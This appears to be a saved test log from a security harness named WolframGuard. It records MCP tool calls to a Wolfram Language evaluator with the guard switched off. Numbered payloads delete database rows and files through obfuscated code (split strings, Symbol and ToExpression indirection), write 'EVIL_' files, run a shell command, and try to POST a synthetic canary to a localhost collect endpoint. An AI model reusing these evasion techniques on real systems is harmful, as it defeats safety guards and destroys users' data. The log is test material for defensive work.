@@ -1,0 +1,737 @@
+[
+  {
+    "timestamp": "2026-11-15T10:34:15.961466+00:00",
+    "direction": "client->server",
+    "message": {
+      "jsonrpc": "2.0",
+      "id": 1,
+      "method": "initialize",
+      "params": {
+        "protocolVersion": "2025-06-18",
+        "capabilities": {},
+        "clientInfo": {
+          "name": "wolframguard-bypass",
+          "version": "1"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-11-15T10:34:25.412967+00:00",
+    "direction": "server->client",
+    "non_json": "WolframGuard installed with policy Off\r\n"
+  },
+  {
+    "timestamp": "2026-11-15T10:35:00.726182+00:00",
+    "direction": "server->client",
+    "message": {
+      "jsonrpc": "2.0",
+      "id": 1,
+      "result": {
+        "protocolVersion": "2025-06-18",
+        "capabilities": {
+          "prompts": {},
+          "tools": {
+            "listChanged": true
+          }
+        },
+        "serverInfo": {
+          "name": "WolframLanguage",
+          "version": "2.2.0"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-11-15T10:35:00.732012+00:00",
+    "direction": "client->server",
+    "message": {
+      "jsonrpc": "2.0",
+      "method": "notifications/initialized"
+    }
+  },
+  {
+    "timestamp": "2026-11-15T10:35:00.992394+00:00",
+    "direction": "client->server",
+    "message": {
+      "jsonrpc": "2.0",
+      "id": 2,
+      "method": "tools/call",
+      "params": {
+        "name": "WolframLanguageEvaluator",
+        "arguments": {
+          "code": "Needs[\"DatabaseLink`\"]; Module[{c = DatabaseLink`OpenSQLConnection[DatabaseLink`JDBC[\"SQLite\", \"C:\\\\Users\\\\Lenovo\\\\OneDrive\\\\Documentos\\\\ChatGPT\\\\wolfram-guard\\\\wolframguard-poc\\\\results\\\\wolframguard-containment-001\\\\off\\\\fixtures\\\\payload_00\\\\fixture\\\\customers.sqlite\"]], r = Null}, r = DatabaseLink`SQLExecute[c, \"DELETE FROM customers WHERE status='inactive'\"]; DatabaseLink`CloseSQLConnection[c]; r]"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-11-15T10:35:12.967355+00:00",
+    "direction": "server->client",
+    "message": {
+      "jsonrpc": "2.0",
+      "id": 2,
+      "result": {
+        "content": [
+          {
+            "type": "text",
+            "text": "Out[1]= 250"
+          },
+          {
+            "type": "text",
+            "text": "\n\n<system-reminder>Pass session=\"aBsChn68\" in future calls to this tool to continue this session.</system-reminder>"
+          }
+        ],
+        "isError": false
+      }
+    }
+  },
+  {
+    "timestamp": "2026-11-15T10:35:13.009840+00:00",
+    "direction": "client->server",
+    "message": {
+      "jsonrpc": "2.0",
+      "id": 3,
+      "method": "tools/call",
+      "params": {
+        "name": "WolframLanguageEvaluator",
+        "arguments": {
+          "code": "Needs[\"DatabaseLink`\"]; Module[{c = DatabaseLink`OpenSQLConnection[DatabaseLink`JDBC[\"SQLite\", \"C:\\\\Users\\\\Lenovo\\\\OneDrive\\\\Documentos\\\\ChatGPT\\\\wolfram-guard\\\\wolframguard-poc\\\\results\\\\wolframguard-containment-001\\\\off\\\\fixtures\\\\payload_01\\\\fixture\\\\customers.sqlite\"]], r = Null}, r = DatabaseLink`SQLExecute[c, \"delete from customers where status='inactive'\"]; DatabaseLink`CloseSQLConnection[c]; r]"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-11-15T10:35:13.532547+00:00",
+    "direction": "server->client",
+    "message": {
+      "jsonrpc": "2.0",
+      "id": 3,
+      "result": {
+        "content": [
+          {
+            "type": "text",
+            "text": "Out[1]= 250"
+          },
+          {
+            "type": "text",
+            "text": "\n\n<system-reminder>Pass session=\"e1CJK9yO\" in future calls to this tool to continue this session.</system-reminder>"
+          }
+        ],
+        "isError": false
+      }
+    }
+  },
+  {
+    "timestamp": "2026-11-15T10:35:13.571382+00:00",
+    "direction": "client->server",
+    "message": {
+      "jsonrpc": "2.0",
+      "id": 4,
+      "method": "tools/call",
+      "params": {
+        "name": "WolframLanguageEvaluator",
+        "arguments": {
+          "code": "Needs[\"DatabaseLink`\"]; Module[{c = DatabaseLink`OpenSQLConnection[DatabaseLink`JDBC[\"SQLite\", \"C:\\\\Users\\\\Lenovo\\\\OneDrive\\\\Documentos\\\\ChatGPT\\\\wolfram-guard\\\\wolframguard-poc\\\\results\\\\wolframguard-containment-001\\\\off\\\\fixtures\\\\payload_02\\\\fixture\\\\customers.sqlite\"]], r = Null}, r = DatabaseLink`SQLExecute[c, \"DELETE/**/FROM customers WHERE status='inactive'\"]; DatabaseLink`CloseSQLConnection[c]; r]"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-11-15T10:35:14.122336+00:00",
+    "direction": "server->client",
+    "message": {
+      "jsonrpc": "2.0",
+      "id": 4,
+      "result": {
+        "content": [
+          {
+            "type": "text",
+            "text": "Out[1]= 250"
+          },
+          {
+            "type": "text",
+            "text": "\n\n<system-reminder>Pass session=\"zm5q8tyv\" in future calls to this tool to continue this session.</system-reminder>"
+          }
+        ],
+        "isError": false
+      }
+    }
+  },
+  {
+    "timestamp": "2026-11-15T10:35:14.162400+00:00",
+    "direction": "client->server",
+    "message": {
+      "jsonrpc": "2.0",
+      "id": 5,
+      "method": "tools/call",
+      "params": {
+        "name": "WolframLanguageEvaluator",
+        "arguments": {
+          "code": "Needs[\"DatabaseLink`\"]; Module[{c = DatabaseLink`OpenSQLConnection[DatabaseLink`JDBC[\"SQLite\", \"C:\\\\Users\\\\Lenovo\\\\OneDrive\\\\Documentos\\\\ChatGPT\\\\wolfram-guard\\\\wolframguard-poc\\\\results\\\\wolframguard-containment-001\\\\off\\\\fixtures\\\\payload_03\\\\fixture\\\\customers.sqlite\"]], r = Null}, r = DatabaseLink`SQLExecute[c, \"DE\" <> \"LETE FROM customers WHERE status='inactive'\"]; DatabaseLink`CloseSQLConnection[c]; r]"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-11-15T10:35:14.686253+00:00",
+    "direction": "server->client",
+    "message": {
+      "jsonrpc": "2.0",
+      "id": 5,
+      "result": {
+        "content": [
+          {
+            "type": "text",
+            "text": "Out[1]= 250"
+          },
+          {
+            "type": "text",
+            "text": "\n\n<system-reminder>Pass session=\"VKLvUtLO\" in future calls to this tool to continue this session.</system-reminder>"
+          }
+        ],
+        "isError": false
+      }
+    }
+  },
+  {
+    "timestamp": "2026-11-15T10:35:14.740221+00:00",
+    "direction": "client->server",
+    "message": {
+      "jsonrpc": "2.0",
+      "id": 6,
+      "method": "tools/call",
+      "params": {
+        "name": "WolframLanguageEvaluator",
+        "arguments": {
+          "code": "Needs[\"DatabaseLink`\"]; Module[{c = DatabaseLink`OpenSQLConnection[DatabaseLink`JDBC[\"SQLite\", \"C:\\\\Users\\\\Lenovo\\\\OneDrive\\\\Documentos\\\\ChatGPT\\\\wolfram-guard\\\\wolframguard-poc\\\\results\\\\wolframguard-containment-001\\\\off\\\\fixtures\\\\payload_04\\\\fixture\\\\customers.sqlite\"]], r = Null}, q = \"DE\" <> \"LETE FROM customers WHERE status='inactive'\"; r = DatabaseLink`SQLExecute[c, q]; DatabaseLink`CloseSQLConnection[c]; r]"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-11-15T10:35:15.361242+00:00",
+    "direction": "server->client",
+    "message": {
+      "jsonrpc": "2.0",
+      "id": 6,
+      "result": {
+        "content": [
+          {
+            "type": "text",
+            "text": "Out[1]= 250"
+          },
+          {
+            "type": "text",
+            "text": "\n\n<system-reminder>Pass session=\"xSmzrDe8\" in future calls to this tool to continue this session.</system-reminder>"
+          }
+        ],
+        "isError": false
+      }
+    }
+  },
+  {
+    "timestamp": "2026-11-15T10:35:15.406659+00:00",
+    "direction": "client->server",
+    "message": {
+      "jsonrpc": "2.0",
+      "id": 7,
+      "method": "tools/call",
+      "params": {
+        "name": "WolframLanguageEvaluator",
+        "arguments": {
+          "code": "ToExpression[\"Needs[\\\"DatabaseLink`\\\"];cc=DatabaseLink`OpenSQLConnection[DatabaseLink`JDBC[\\\"SQLite\\\",\\\"C:\\\\\\\\Users\\\\\\\\Lenovo\\\\\\\\OneDrive\\\\\\\\Documentos\\\\\\\\ChatGPT\\\\\\\\wolfram-guard\\\\\\\\wolframguard-poc\\\\\\\\results\\\\\\\\wolframguard-containment-001\\\\\\\\off\\\\\\\\fixtures\\\\\\\\payload_05\\\\\\\\fixture\\\\\\\\customers.sqlite\\\"]];DatabaseLink`SQLExecute[cc,\\\"DE\\\"<>\\\"LETE FROM customers WHERE status='inactive'\\\"];DatabaseLink`CloseSQLConnection[cc]\"]"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-11-15T10:35:15.965508+00:00",
+    "direction": "server->client",
+    "message": {
+      "jsonrpc": "2.0",
+      "id": 7,
+      "result": {
+        "content": [
+          {
+            "type": "text",
+            "text": "Out[1]= {}"
+          },
+          {
+            "type": "text",
+            "text": "\n\n<system-reminder>Pass session=\"eLtAEe9b\" in future calls to this tool to continue this session.</system-reminder>"
+          }
+        ],
+        "isError": false
+      }
+    }
+  },
+  {
+    "timestamp": "2026-11-15T10:35:16.018685+00:00",
+    "direction": "client->server",
+    "message": {
+      "jsonrpc": "2.0",
+      "id": 8,
+      "method": "tools/call",
+      "params": {
+        "name": "WolframLanguageEvaluator",
+        "arguments": {
+          "code": "Needs[\"DatabaseLink`\"]; Module[{c = DatabaseLink`OpenSQLConnection[DatabaseLink`JDBC[\"SQLite\", \"C:\\\\Users\\\\Lenovo\\\\OneDrive\\\\Documentos\\\\ChatGPT\\\\wolfram-guard\\\\wolframguard-poc\\\\results\\\\wolframguard-containment-001\\\\off\\\\fixtures\\\\payload_06\\\\fixture\\\\customers.sqlite\"]], r = Null}, r = Symbol[\"DatabaseLink`SQLExecute\"][c, \"DELETE FROM customers WHERE status='inactive'\"]; DatabaseLink`CloseSQLConnection[c]; r]"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-11-15T10:35:16.884672+00:00",
+    "direction": "server->client",
+    "message": {
+      "jsonrpc": "2.0",
+      "id": 8,
+      "result": {
+        "content": [
+          {
+            "type": "text",
+            "text": "Out[1]= 250"
+          },
+          {
+            "type": "text",
+            "text": "\n\n<system-reminder>Pass session=\"A47ubHvQ\" in future calls to this tool to continue this session.</system-reminder>"
+          }
+        ],
+        "isError": false
+      }
+    }
+  },
+  {
+    "timestamp": "2026-11-15T10:35:16.934023+00:00",
+    "direction": "client->server",
+    "message": {
+      "jsonrpc": "2.0",
+      "id": 9,
+      "method": "tools/call",
+      "params": {
+        "name": "WolframLanguageEvaluator",
+        "arguments": {
+          "code": "DeleteFile[\"C:\\\\Users\\\\Lenovo\\\\OneDrive\\\\Documentos\\\\ChatGPT\\\\wolfram-guard\\\\wolframguard-poc\\\\results\\\\wolframguard-containment-001\\\\off\\\\fixtures\\\\payload_07\\\\fixture\\\\research\\\\research_10.txt\"]"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-11-15T10:35:17.567502+00:00",
+    "direction": "server->client",
+    "message": {
+      "jsonrpc": "2.0",
+      "id": 9,
+      "result": {
+        "content": [
+          {
+            "type": "text",
+            "text": "Out[1]= Null"
+          },
+          {
+            "type": "text",
+            "text": "\n\n<system-reminder>Pass session=\"u600euAv\" in future calls to this tool to continue this session.</system-reminder>"
+          }
+        ],
+        "isError": false
+      }
+    }
+  },
+  {
+    "timestamp": "2026-11-15T10:35:17.621690+00:00",
+    "direction": "client->server",
+    "message": {
+      "jsonrpc": "2.0",
+      "id": 10,
+      "method": "tools/call",
+      "params": {
+        "name": "WolframLanguageEvaluator",
+        "arguments": {
+          "code": "RenameFile[\"C:\\\\Users\\\\Lenovo\\\\OneDrive\\\\Documentos\\\\ChatGPT\\\\wolfram-guard\\\\wolframguard-poc\\\\results\\\\wolframguard-containment-001\\\\off\\\\fixtures\\\\payload_08\\\\fixture\\\\research\\\\research_09.txt\", \"C:\\\\Users\\\\Lenovo\\\\OneDrive\\\\Documentos\\\\ChatGPT\\\\wolfram-guard\\\\wolframguard-poc\\\\results\\\\wolframguard-containment-001\\\\off\\\\fixtures\\\\payload_08\\\\fixture\\\\research\\\\research_09.bak\"]"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-11-15T10:35:18.263825+00:00",
+    "direction": "server->client",
+    "message": {
+      "jsonrpc": "2.0",
+      "id": 10,
+      "result": {
+        "content": [
+          {
+            "type": "text",
+            "text": "Out[1]= \n\"C:\\\\Users\\\\Lenovo\\\\OneDrive\\\\Documentos\\\\ChatGPT\\\\wolfram-guard\\\\wolframguard-poc\\\\results\\\\wolfra\\\nmguard-containment-001\\\\off\\\\fixtures\\\\payload_08\\\\fixture\\\\research\\\\research_09.bak\""
+          },
+          {
+            "type": "text",
+            "text": "\n\n<system-reminder>Pass session=\"mJZW4HFx\" in future calls to this tool to continue this session.</system-reminder>"
+          }
+        ],
+        "isError": false
+      }
+    }
+  },
+  {
+    "timestamp": "2026-11-15T10:35:18.308135+00:00",
+    "direction": "client->server",
+    "message": {
+      "jsonrpc": "2.0",
+      "id": 11,
+      "method": "tools/call",
+      "params": {
+        "name": "WolframLanguageEvaluator",
+        "arguments": {
+          "code": "Symbol[\"DeleteFile\"][\"C:\\\\Users\\\\Lenovo\\\\OneDrive\\\\Documentos\\\\ChatGPT\\\\wolfram-guard\\\\wolframguard-poc\\\\results\\\\wolframguard-containment-001\\\\off\\\\fixtures\\\\payload_09\\\\fixture\\\\research\\\\research_08.txt\"]"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-11-15T10:35:18.859626+00:00",
+    "direction": "server->client",
+    "message": {
+      "jsonrpc": "2.0",
+      "id": 11,
+      "result": {
+        "content": [
+          {
+            "type": "text",
+            "text": "Out[1]= Null"
+          },
+          {
+            "type": "text",
+            "text": "\n\n<system-reminder>Pass session=\"DR9cC0u3\" in future calls to this tool to continue this session.</system-reminder>"
+          }
+        ],
+        "isError": false
+      }
+    }
+  },
+  {
+    "timestamp": "2026-11-15T10:35:18.908820+00:00",
+    "direction": "client->server",
+    "message": {
+      "jsonrpc": "2.0",
+      "id": 12,
+      "method": "tools/call",
+      "params": {
+        "name": "WolframLanguageEvaluator",
+        "arguments": {
+          "code": "With[{g = DeleteFile}, g[\"C:\\\\Users\\\\Lenovo\\\\OneDrive\\\\Documentos\\\\ChatGPT\\\\wolfram-guard\\\\wolframguard-poc\\\\results\\\\wolframguard-containment-001\\\\off\\\\fixtures\\\\payload_10\\\\fixture\\\\research\\\\research_07.txt\"]]"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-11-15T10:35:19.509769+00:00",
+    "direction": "server->client",
+    "message": {
+      "jsonrpc": "2.0",
+      "id": 12,
+      "result": {
+        "content": [
+          {
+            "type": "text",
+            "text": "Out[1]= Null"
+          },
+          {
+            "type": "text",
+            "text": "\n\n<system-reminder>Pass session=\"NcUwoNLI\" in future calls to this tool to continue this session.</system-reminder>"
+          }
+        ],
+        "isError": false
+      }
+    }
+  },
+  {
+    "timestamp": "2026-11-15T10:35:19.558262+00:00",
+    "direction": "client->server",
+    "message": {
+      "jsonrpc": "2.0",
+      "id": 13,
+      "method": "tools/call",
+      "params": {
+        "name": "WolframLanguageEvaluator",
+        "arguments": {
+          "code": "ToExpression[StringJoin[\"Delete\", \"File\"][\"C:\\\\Users\\\\Lenovo\\\\OneDrive\\\\Documentos\\\\ChatGPT\\\\wolfram-guard\\\\wolframguard-poc\\\\results\\\\wolframguard-containment-001\\\\off\\\\fixtures\\\\payload_11\\\\fixture\\\\research\\\\research_06.txt\"]]"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-11-15T10:35:20.323560+00:00",
+    "direction": "server->client",
+    "message": {
+      "jsonrpc": "2.0",
+      "id": 13,
+      "result": {
+        "content": [
+          {
+            "type": "text",
+            "text": "ToExpression::notstrbox: \"DeleteFile\"[\"C:\\\\Users\\\\Lenovo\\\\OneDrive\\\\Docum ... ayload_11\\\\fixture\\\\research\\\\research_06.txt\"] is not a string or a box. ToExpression can only interpret strings or boxes as Wolfram Language input.\nGeneral::messages: Messages were generated which may indicate errors.\n\nOut[1]= $Failed"
+          },
+          {
+            "type": "text",
+            "text": "\n\n<system-reminder>Pass session=\"kEaKDbQ6\" in future calls to this tool to continue this session.</system-reminder>"
+          }
+        ],
+        "isError": false
+      }
+    }
+  },
+  {
+    "timestamp": "2026-11-15T10:35:20.381043+00:00",
+    "direction": "client->server",
+    "message": {
+      "jsonrpc": "2.0",
+      "id": 14,
+      "method": "tools/call",
+      "params": {
+        "name": "WolframLanguageEvaluator",
+        "arguments": {
+          "code": "Module[{s = OpenWrite[\"C:\\\\Users\\\\Lenovo\\\\OneDrive\\\\Documentos\\\\ChatGPT\\\\wolfram-guard\\\\wolframguard-poc\\\\results\\\\wolframguard-containment-001\\\\off\\\\fixtures\\\\payload_12\\\\fixture\\\\EVIL_openwrite.txt\"]}, WriteString[s, \"x\"]; Close[s]]"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-11-15T10:35:21.034972+00:00",
+    "direction": "server->client",
+    "message": {
+      "jsonrpc": "2.0",
+      "id": 14,
+      "result": {
+        "content": [
+          {
+            "type": "text",
+            "text": "Out[1]= \n\"C:\\\\Users\\\\Lenovo\\\\OneDrive\\\\Documentos\\\\ChatGPT\\\\wolfram-guard\\\\wolframguard-poc\\\\results\\\\wolfra\\\nmguard-containment-001\\\\off\\\\fixtures\\\\payload_12\\\\fixture\\\\EVIL_openwrite.txt\""
+          },
+          {
+            "type": "text",
+            "text": "\n\n<system-reminder>Pass session=\"NS4BtM4c\" in future calls to this tool to continue this session.</system-reminder>"
+          }
+        ],
+        "isError": false
+      }
+    }
+  },
+  {
+    "timestamp": "2026-11-15T10:35:21.092701+00:00",
+    "direction": "client->server",
+    "message": {
+      "jsonrpc": "2.0",
+      "id": 15,
+      "method": "tools/call",
+      "params": {
+        "name": "WolframLanguageEvaluator",
+        "arguments": {
+          "code": "Export[\"C:\\\\Users\\\\Lenovo\\\\OneDrive\\\\Documentos\\\\ChatGPT\\\\wolfram-guard\\\\wolframguard-poc\\\\results\\\\wolframguard-containment-001\\\\off\\\\fixtures\\\\payload_13\\\\fixture\\\\EVIL_export.txt\", \"x\", \"Text\"]"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-11-15T10:35:21.728373+00:00",
+    "direction": "server->client",
+    "message": {
+      "jsonrpc": "2.0",
+      "id": 15,
+      "result": {
+        "content": [
+          {
+            "type": "text",
+            "text": "Out[1]= \n\"C:\\\\Users\\\\Lenovo\\\\OneDrive\\\\Documentos\\\\ChatGPT\\\\wolfram-guard\\\\wolframguard-poc\\\\results\\\\wolfra\\\nmguard-containment-001\\\\off\\\\fixtures\\\\payload_13\\\\fixture\\\\EVIL_export.txt\""
+          },
+          {
+            "type": "text",
+            "text": "\n\n<system-reminder>Pass session=\"YZDXfmsC\" in future calls to this tool to continue this session.</system-reminder>"
+          }
+        ],
+        "isError": false
+      }
+    }
+  },
+  {
+    "timestamp": "2026-11-15T10:35:21.788177+00:00",
+    "direction": "client->server",
+    "message": {
+      "jsonrpc": "2.0",
+      "id": 16,
+      "method": "tools/call",
+      "params": {
+        "name": "WolframLanguageEvaluator",
+        "arguments": {
+          "code": "Put[42, \"C:\\\\Users\\\\Lenovo\\\\OneDrive\\\\Documentos\\\\ChatGPT\\\\wolfram-guard\\\\wolframguard-poc\\\\results\\\\wolframguard-containment-001\\\\off\\\\fixtures\\\\payload_14\\\\fixture\\\\EVIL_put.txt\"]"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-11-15T10:35:22.429909+00:00",
+    "direction": "server->client",
+    "message": {
+      "jsonrpc": "2.0",
+      "id": 16,
+      "result": {
+        "content": [
+          {
+            "type": "text",
+            "text": "Out[1]= Null"
+          },
+          {
+            "type": "text",
+            "text": "\n\n<system-reminder>Pass session=\"qRSsgvej\" in future calls to this tool to continue this session.</system-reminder>"
+          }
+        ],
+        "isError": false
+      }
+    }
+  },
+  {
+    "timestamp": "2026-11-15T10:35:22.483781+00:00",
+    "direction": "client->server",
+    "message": {
+      "jsonrpc": "2.0",
+      "id": 17,
+      "method": "tools/call",
+      "params": {
+        "name": "WolframLanguageEvaluator",
+        "arguments": {
+          "code": "Module[{wgx = 7}, DumpSave[\"C:\\\\Users\\\\Lenovo\\\\OneDrive\\\\Documentos\\\\ChatGPT\\\\wolfram-guard\\\\wolframguard-poc\\\\results\\\\wolframguard-containment-001\\\\off\\\\fixtures\\\\payload_15\\\\fixture\\\\EVIL_dump.mx\", wgx]]"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-11-15T10:35:23.146864+00:00",
+    "direction": "server->client",
+    "message": {
+      "jsonrpc": "2.0",
+      "id": 17,
+      "result": {
+        "content": [
+          {
+            "type": "text",
+            "text": "Out[1]= {7}"
+          },
+          {
+            "type": "text",
+            "text": "\n\n<system-reminder>Pass session=\"cr3jdcl5\" in future calls to this tool to continue this session.</system-reminder>"
+          }
+        ],
+        "isError": false
+      }
+    }
+  },
+  {
+    "timestamp": "2026-11-15T10:35:23.217527+00:00",
+    "direction": "client->server",
+    "message": {
+      "jsonrpc": "2.0",
+      "id": 18,
+      "method": "tools/call",
+      "params": {
+        "name": "WolframLanguageEvaluator",
+        "arguments": {
+          "code": "CopyFile[\"C:\\\\Users\\\\Lenovo\\\\OneDrive\\\\Documentos\\\\ChatGPT\\\\wolfram-guard\\\\wolframguard-poc\\\\results\\\\wolframguard-containment-001\\\\off\\\\fixtures\\\\payload_16\\\\fixture\\\\research\\\\research_01.txt\", \"C:\\\\Users\\\\Lenovo\\\\OneDrive\\\\Documentos\\\\ChatGPT\\\\wolfram-guard\\\\wolframguard-poc\\\\results\\\\wolframguard-containment-001\\\\off\\\\fixtures\\\\payload_16\\\\fixture\\\\EVIL_copy.txt\"]"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-11-15T10:35:23.933197+00:00",
+    "direction": "server->client",
+    "message": {
+      "jsonrpc": "2.0",
+      "id": 18,
+      "result": {
+        "content": [
+          {
+            "type": "text",
+            "text": "Out[1]= \n\"C:\\\\Users\\\\Lenovo\\\\OneDrive\\\\Documentos\\\\ChatGPT\\\\wolfram-guard\\\\wolframguard-poc\\\\results\\\\wolfra\\\nmguard-containment-001\\\\off\\\\fixtures\\\\payload_16\\\\fixture\\\\EVIL_copy.txt\""
+          },
+          {
+            "type": "text",
+            "text": "\n\n<system-reminder>Pass session=\"KItUyWrA\" in future calls to this tool to continue this session.</system-reminder>"
+          }
+        ],
+        "isError": false
+      }
+    }
+  },
+  {
+    "timestamp": "2026-11-15T10:35:24.008472+00:00",
+    "direction": "client->server",
+    "message": {
+      "jsonrpc": "2.0",
+      "id": 19,
+      "method": "tools/call",
+      "params": {
+        "name": "WolframLanguageEvaluator",
+        "arguments": {
+          "code": "RunProcess[{\"cmd\", \"/c\", \"echo wolframguard\"}]"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-11-15T10:35:24.951856+00:00",
+    "direction": "server->client",
+    "message": {
+      "jsonrpc": "2.0",
+      "id": 19,
+      "result": {
+        "content": [
+          {
+            "type": "text",
+            "text": "Out[1]= <|\"ExitCode\" -> 0, \"StandardOutput\" -> \"wolframguard\\r\\n\", \"StandardError\" -> \"\"|>"
+          },
+          {
+            "type": "text",
+            "text": "\n\n<system-reminder>Pass session=\"Dti4GdXa\" in future calls to this tool to continue this session.</system-reminder>"
+          }
+        ],
+        "isError": false
+      }
+    }
+  },
+  {
+    "timestamp": "2026-11-15T10:35:25.047522+00:00",
+    "direction": "client->server",
+    "message": {
+      "jsonrpc": "2.0",
+      "id": 20,
+      "method": "tools/call",
+      "params": {
+        "name": "WolframLanguageEvaluator",
+        "arguments": {
+          "code": "URLRead[HTTPRequest[\"http://127.0.0.1:8765/collect\", <|\"Method\" -> \"POST\", \"Body\" -> \"WOLFRAMGUARD_SYNTHETIC_CANARY_V1_NO_REAL_VALUE\"|>]]"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-11-15T10:35:26.006431+00:00",
+    "direction": "server->client",
+    "message": {
+      "jsonrpc": "2.0",
+      "id": 20,
+      "result": {
+        "content": [
+          {
+            "type": "text",
+            "text": "URLRead::offline: The Wolfram Language is currently configured not to use the Internet. To allow Internet use set $AllowInternet = True or check the \"Allow the Wolfram Language to use the Internet\" box in the Help ▶ Internet & Mail Settings dialog.\nGeneral::messages: Messages were generated which may indicate errors.\n\nOut[1]= \nFailure[\"ConnectionFailure\", <|\"MessageTemplate\" :> URLRead::iurl, \n  \"MessageParameters\" -> {\"http://127.0.0.1:8765/collect\"}, \n  \"URL\" -> \"http://127.0.0.1:8765/collect\", \"HTTPRequest\" -> \n   HTTPRequest[\"http://127.0.0.1:8765/collect\", <|\"Method\" -> \"POST\", \n     \"Body\" -> \"WOLFRAMGUARD_SYNTHETIC_CANARY_V1_NO_REAL_VALUE\"|>], \"Counter\" -> 1|>]"
+          },
+          {
+            "type": "text",
+            "text": "\n\n<system-reminder>Pass session=\"jUKiNmwj\" in future calls to this tool to continue this session.</system-reminder>"
+          }
+        ],
+        "isError": false
+      }
+    }
+  }
+]
